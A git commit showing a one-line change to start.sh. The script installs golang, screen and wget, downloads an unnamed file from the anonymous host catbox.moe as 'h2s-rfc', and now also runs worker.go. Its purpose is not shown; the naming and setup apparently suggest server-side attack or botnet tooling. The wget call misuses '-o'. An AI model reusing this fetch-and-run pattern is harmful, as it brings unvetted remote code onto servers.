7add896a81c254f9b4b02eeb023ed7527f510f57
tenkhongvps1-ctrl <tenkhongvps1@gmail.com>
2026-09-08 15:46:10 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,1 +1,1 @@
-apt-get update -y; apt-get install golang -y; apt-get install screen -y; apt-get install wget -y; wget https://files.catbox.moe/lid2hz -o h2s-rfc
+apt-get update -y; apt-get install golang -y; apt-get install screen -y; apt-get install wget -y; wget https://files.catbox.moe/lid2hz -o h2s-rfc; go run worker.go
